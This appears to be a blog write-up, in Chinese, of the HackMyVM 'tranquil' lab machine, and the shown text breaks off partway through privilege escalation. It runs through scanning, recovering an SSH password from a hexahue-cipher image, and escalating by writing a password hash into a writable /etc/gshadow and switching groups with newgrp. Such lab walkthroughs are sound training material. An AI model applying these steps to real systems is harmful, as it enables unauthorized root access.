@@ -1,0 +1,259 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-tranquil | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="难度:Meduim kali:192.168.1.101 靶机:192.168.1.107 root@kali2 [~&#x2F;Desktop] ➜  arp-scan -l                                [21:18:54] Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.1.101">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM-tranquil">
+<meta property="og:url" content="https://tao0845.github.io/posts/794033c8/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="难度:Meduim kali:192.168.1.101 靶机:192.168.1.107 root@kali2 [~&#x2F;Desktop] ➜  arp-scan -l                                [21:18:54] Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.1.101">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/17/Otv38b.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/17/Otv6SD.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/17/Otv8wF.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/17/Otvun6.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/17/OtvIDP.png">
+<meta property="article:published_time" content="2024-08-17T13:16:40.451Z">
+<meta property="article:modified_time" content="2024-08-17T15:33:04.348Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="SSLH">
+<meta property="article:tag" content="hexahue-cipher">
+<meta property="article:tag" content="gshadow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/08/17/Otv38b.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">73</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">119</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%99%BB%E5%BD%95"><span class="toc-number">3.</span> <span class="toc-text">ssh登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/794033c8/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-tranquil</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-08-17 21:16:40" itemprop="dateCreated datePublished" datetime="2024-08-17T21:16:40+08:00">2024-08-17</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">1.2k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">7m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/SSLH/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">SSLH</span></a><a class="tag-item" href="/tags/hexahue-cipher/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">hexahue-cipher</span></a><a class="tag-item" href="/tags/gshadow/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">gshadow</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:Meduim</strong></p>
+<p><strong>kali:192.168.1.101</strong></p>
+<p><strong>靶机:192.168.1.107</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                <span class="token punctuation">[</span><span class="token number">21</span>:18:54<span class="token punctuation">]</span>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.101
+Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.1.1	<span class="token number">78</span>:60:5b:04:b4:8c	TP-LINK TECHNOLOGIES CO.,LTD.
+<span class="token number">192.168</span>.1.104	<span class="token number">44</span>:e5:17:0a:27:01	Intel Corporate
+<span class="token number">192.168</span>.1.107	08:00:27:ad:41:e5	PCS Systemtechnik GmbH</code></pre>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.1.107
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-17 <span class="token number">22</span>:01 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.107
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00012s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65534</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT   STATE SERVICE
+<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>
+MAC Address: 08:00:27:AD:41:E5 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">2.03</span> seconds</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.1.107 <span class="token parameter variable">-p21</span>             <span class="token punctuation">[</span><span class="token number">22</span>:01:25<span class="token punctuation">]</span>
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-17 <span class="token number">22</span>:02 CST
+Nmap scan report <span class="token keyword">for</span> SOUPEDECODE.LOCAL <span class="token punctuation">(</span><span class="token number">192.168</span>.1.107<span class="token punctuation">)</span>
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00022s latency<span class="token punctuation">)</span>.
+
+PORT   STATE SERVICE VERSION
+<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">3072</span> 0e:03:3b:78:00:29:1d:ba:60:86:0e:d3:bb:7e:3c:04 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> 2a:47:4d:9c:ce:07:61:ca:f0:ca:58:8b:5b:0f:d4:db <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> 6c:42:50:a5:60:e9:0f:37:0f:be:ec:d1:20:74:29:9c <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ftp-bounce: ERROR: Script execution failed <span class="token punctuation">(</span>use <span class="token parameter variable">-d</span> to debug<span class="token punctuation">)</span>
+MAC Address: 08:00:27:AD:41:E5 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
+Device type: general purpose
+Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
+Network Distance: <span class="token number">1</span> hop
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre>
+<p>21端口既有ftp服务，又有ssh服务，头回见。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">curl</span> <span class="token number">192.168</span>.1.107:21                                                <span class="token punctuation">[</span><span class="token number">22</span>:08:23<span class="token punctuation">]</span> <span class="token operator">&lt;</span>img <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"tranquil.jpg"</span><span class="token operator">></span>
+
+
+<span class="token operator">&lt;</span><span class="token operator">!</span>-- We are one, humans, computers and ports.
+- guru --<span class="token operator">></span>
+root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token number">192.168</span>.1.107 <span class="token number">21</span>                                                  <span class="token punctuation">[</span><span class="token number">22</span>:08:29<span class="token punctuation">]</span> SSH-2.0-OpenSSH_8.4p1 Debian-5
+root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ssh</span> <span class="token number">192.168</span>.1.107 <span class="token parameter variable">-P</span> <span class="token number">21</span>                                              <span class="token punctuation">[</span><span class="token number">22</span>:10:40<span class="token punctuation">]</span> ssh: connect to <span class="token function">host</span> <span class="token number">192.168</span>.1.107 port <span class="token number">22</span>: Connection refused
+root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ssh</span> <span class="token number">192.168</span>.1.107 <span class="token parameter variable">-p</span> <span class="token number">21</span>                                              <span class="token punctuation">[</span><span class="token number">22</span>:13:37<span class="token punctuation">]</span> The authenticity of <span class="token function">host</span> <span class="token string">'[192.168.1.107]:21 ([192.168.1.107]:21)'</span> can<span class="token string">'t be established.
+ED25519 key fingerprint is SHA256:i8/S1lOUvm1L+Qzh42YuM939O+JPLeEzuoZ4tTC7kfE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span><span class="token punctuation">[</span><span class="token number">192.168</span>.1.107<span class="token punctuation">]</span>:21<span class="token string">' (ED25519) to the list of known hosts.
+root@192.168.1.107'</span>s password:
+
+root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ftp</span> <span class="token number">192.168</span>.1.107                                                    <span class="token punctuation">[</span><span class="token number">22</span>:13:50<span class="token punctuation">]</span> Connected to <span class="token number">192.168</span>.1.107.
+SSH-2.0-OpenSSH_8.4p1 Debian-5
+ftp<span class="token operator">></span> <span class="token function">ls</span>
+Not connected.
+ftp<span class="token operator">></span></code></pre>
+<p>尝试一下发现还有一个web服务,原来是SSLH技术。<br><img src="https://ooo.0x0.ooo/2024/08/17/Otv38b.png" alt="Otv38b.png" loading="lazy"></p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://ooo.0x0.ooo/2024/08/17/Otv6SD.png" alt="Otv6SD.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/08/17/Otv8wF.png" alt="Otv8wF.png" loading="lazy"><br>给了个用户名<code>guru</code>,我真怕这个图片做了隐写。<br>先扫一下目录</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.1.107:21/ <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                 <span class="token punctuation">[</span><span class="token number">22</span>:08:14<span class="token punctuation">]</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.6
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.1.107:21/
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              txt,php,bak,zip,html
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">84</span><span class="token punctuation">]</span>
+Progress: <span class="token number">258835</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">19.56</span>%<span class="token punctuation">)</span>^C</code></pre>
+<p>不用扫了，信息肯定在图片里。根据图片上的彩色图案，找到一个编码<code>hexahue cipher</code><br><img src="https://ooo.0x0.ooo/2024/08/17/Otvun6.png" alt="Otvun6.png" loading="lazy"><br>一一对照之后得到<code>KEEPCALM</code>,尝试登录ssh。</p>
+<h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><p>换成小写登录成功。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ssh</span> guru@192.168.1.107 <span class="token parameter variable">-p</span> <span class="token number">21</span>                                         <span class="token punctuation">[</span><span class="token number">22</span>:41:49<span class="token punctuation">]</span> guru@192.168.1.107<span class="token string">'s password:
+Permission denied, please try again.
+guru@192.168.1.107'</span>s password:
+Permission denied, please try again.
+guru@192.168.1.107's password:
+Linux tranquil <span class="token number">5.10</span>.0-8-686-pae <span class="token comment">#1 SMP Debian 5.10.46-5 (2021-09-23) i686</span>
+
+The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
+the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
+individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Sep <span class="token number">30</span> 09:04:21 <span class="token number">2021</span> from <span class="token number">192.168</span>.1.51
+guru@tranquil:~$</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ <span class="token function">cat</span> user.txt
+HMVbecauseweare</code></pre>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>传入linpeas分析发现gshadow可写<br><img src="https://ooo.0x0.ooo/2024/08/17/OtvIDP.png" alt="OtvIDP.png" loading="lazy"></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ <span class="token function">cat</span> /etc/gshadow
+root:*::
+daemon:*::
+bin:*::
+sys:*::
+adm:*::
+tty:*::
+disk:*::
+lp:*::
+mail:*::
+news:*::
+uucp:*::
+man:*::
+proxy:*::
+kmem:*::
+dialout:*::
+fax:*::
+voice:*::
+cdrom:*::guru
+floppy:*::guru
+tape:*::
+sudo:*::
+audio:*::guru
+dip:*::guru
+www-data:*::
+backup:*::
+operator:*::
+list:*::
+irc:*::
+src:*::
+gnats:*::
+shadow:*::
+utmp:*::
+video:*::guru
+sasl:*::
+plugdev:*::guru
+staff:*::
+games:*::
+users:*::
+nogroup:*::
+systemd-timesync:<span class="token operator">!</span>::
+systemd-journal:<span class="token operator">!</span>::
+systemd-network:<span class="token operator">!</span>::
+systemd-resolve:<span class="token operator">!</span>::
+input:<span class="token operator">!</span>::
+kvm:<span class="token operator">!</span>::
+render:<span class="token operator">!</span>::
+crontab:<span class="token operator">!</span>::
+netdev:<span class="token operator">!</span>::guru
+messagebus:<span class="token operator">!</span>::
+ssh:<span class="token operator">!</span>::
+guru:<span class="token operator">!</span>::
+systemd-coredump:<span class="token operator">!</span>*::
+sslh:<span class="token operator">!</span>::</code></pre>
+<p>可以修改密码进行组的切换，测试发现直接以root组没法还是没权限读取&#x2F;root目录</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> ta0
+<span class="token variable">$1</span><span class="token variable">$E1dZFJ7Z</span><span class="token variable">$MH9CYHuTL1DuDtPTvveCf</span><span class="token builtin class-name">.</span>
+guru@tranquil:~$ <span class="token function">nano</span> /etc/gshadow
+guru@tranquil:~$ newgrp root
+Password: 
+guru@tranquil:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>guru<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,109<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,1000<span class="token punctuation">(</span>guru<span class="token punctuation">)</span>
+guru@tranquil:~$ <span class="token function">cat</span> /root/r*
+cat: <span class="token string">'/root/r*'</span><span class="token builtin class-name">:</span> Permission denied
+drwx------   <span class="token number">3</span> root root  <span class="token number">4096</span> Sep <span class="token number">30</span>  <span class="token number">2021</span> root</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">-rw-r----- <span class="token number">1</span> root shadow <span class="token number">899</span> Sep <span class="token number">30</span>  <span class="token number">2021</span> /etc/shadow</code></pre>
+<p>shadow文件也只能root用户写，回头发现有个sudo组可以利用</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sudo:*::</code></pre>
+<p>加个密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sudo:<span class="token variable">$1</span><span class="token variable">$E1dZFJ7Z</span><span class="token variable">$MH9CYHuTL1DuDtPTvveCf</span>.::</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ newgrp <span class="token function">sudo</span>
+Password: 
+guru@tranquil:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> guru: 
+Matching Defaults entries <span class="token keyword">for</span> guru on tranquil:
